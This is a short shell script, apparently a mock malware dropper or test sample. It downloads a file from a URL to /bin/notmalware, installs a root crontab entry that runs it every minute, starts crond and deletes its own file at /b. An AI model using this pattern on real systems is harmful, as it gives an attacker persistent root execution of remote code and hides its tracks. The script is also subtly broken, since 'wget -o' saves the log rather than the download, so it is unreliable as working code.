A="http://google.com"
B="/bin/notmalware"
C="/b"

mkdir -p $(dirname $B)

wget $A -o $B
mkdir -p /var/spool/cron/crontabs
echo "* * * * * bash $B" > /var/spool/cron/crontabs/root
crond
rm $C
